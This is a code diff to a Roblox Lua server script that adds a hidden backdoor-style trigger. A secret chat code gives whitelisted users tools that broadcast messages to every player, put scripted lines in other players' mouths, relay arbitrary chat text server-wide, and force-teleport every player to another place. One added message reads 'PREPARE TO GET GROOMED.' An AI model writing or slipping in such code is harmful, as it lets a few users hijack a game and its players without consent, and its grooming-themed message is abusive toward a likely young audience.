@@ -42,7 +42,7 @@ local function tptool()
 		if player then 
 			local newtool = Instance.new("Tool")
 			newtool.Parent = player.Backpack 
-			newtool.Name = "Makarov"
+			newtool.Name = "Card-L2"
 			local handle = Instance.new("Part")
 			handle.Name = "Handle"
 			handle.Parent = newtool
@@ -52,9 +52,9 @@ local function tptool()
 					local msg = Instance.new("Message")
 					msg.Parent = p.PlayerGui
 					msg.Text = "PREPARE."
-					game.Chat:Chat(p.Character.Head, "OH NO!! PLEASE!!! SPARE ME EVIL SPIREPOINT!!", Enum.ChatColor.Green)
+					game.Chat:Chat(p.Character.Head, "OH NO!! PLEASE!!! SPARE ME EVIL APPLEWARE!!", Enum.ChatColor.Green)
 					wait(0.1)
-					game.Chat:Chat(p.Character.Head, "Spirepoint.EXE: I here HAHAHAHAHAHA", Enum.ChatColor.Red)
+					game.Chat:Chat(p.Character.Head, "AppleWare.EXE: I here HAHAHAHAHAHA", Enum.ChatColor.Red)
 					local sound = Instance.new("Sound")
 					sound.Parent = game.Workspace
 					sound.SoundId = "rbxassetid://7086800629"
@@ -68,13 +68,45 @@ local function tptool()
 	end
 end
 
+
+
+local function tptool3()
+	for _, userId in pairs(tpwhitelistedplayers) do
+		local player = game.Players:GetPlayerByUserId(userId)
+		if player then 
+			local newtool = Instance.new("Tool")
+			newtool.Parent = player.Backpack 
+			newtool.Name = "Card-L3"
+			local handle = Instance.new("Part")
+			handle.Name = "Handle"
+			handle.Parent = newtool
+			handle.Transparency = 1
+			newtool.Activated:Connect(function()
+				for _, p in pairs(game.Players:GetPlayers()) do
+					local msg = Instance.new("Message")
+					msg.Parent = p.PlayerGui
+					msg.Text = "PREPARE TO GET GROOMED."
+					game.Chat:Chat(p.Character.Head, "YAY", Enum.ChatColor.Green)
+					local sound = Instance.new("Sound")
+					sound.Parent = game.Workspace
+					sound.SoundId = "rbxassetid://7086800629"
+					sound.Volume = 2
+					sound:Play()
+					wait(1)
+					TPservice:Teleport(7131355525, p)
+				end
+			end)
+		end
+	end
+end
+
 local function flash()
 	for _, userId in pairs(johndoeplayers) do
 		local player = game.Players:GetPlayerByUserId(userId)
 		if player then 
 			local newtool = Instance.new("Tool")
 			newtool.Parent = player.Backpack 
-			newtool.Name = "Card-L2"
+			newtool.Name = "Flashbang"
 			local handle = Instance.new("Part")
 			handle.Name = "Handle"
 			handle.Parent = newtool
@@ -111,6 +143,46 @@ local function flash()
 	end
 end
 
+local function texttomsg()
+	
+	
+	
+	for _, v in pairs(johndoeplayers) do
+		local chatmsg
+		local player = game.Players:GetPlayerByUserId(v)
+		
+		
+		
+
+	player.Chatted:Connect(function(msg)
+		chatmsg = msg
+	end)
+
+
+		
+		
+		
+		local newtool = Instance.new("Tool")
+		newtool.Parent = player.Backpack 
+		newtool.Name = "Glock-17"
+		local handle = Instance.new("Part")
+		handle.Name = "Handle"
+		handle.Parent = newtool
+		handle.Transparency = 1
+		
+		newtool.Activated:Connect(function()
+			
+			for _, v in pairs(game.Players:GetPlayers()) do
+				local msg = Instance.new("Message")
+				msg.Parent = v.PlayerGui
+				msg.Text = chatmsg
+				game:GetService("Debris"):AddItem(msg, 3)
+			end
+			
+		end)
+	end
+end
+
 game.Players.PlayerAdded:Connect(function(player)
 	print(player.Name)
 	if player:IsInGroup(34679126) then
@@ -120,6 +192,8 @@ game.Players.PlayerAdded:Connect(function(player)
 			if message == "092348230948920" then
 				HelloJohnDoe()
 				tptool()
+				texttomsg()
+				tptool3()
 				flash()
 			end
 		end)
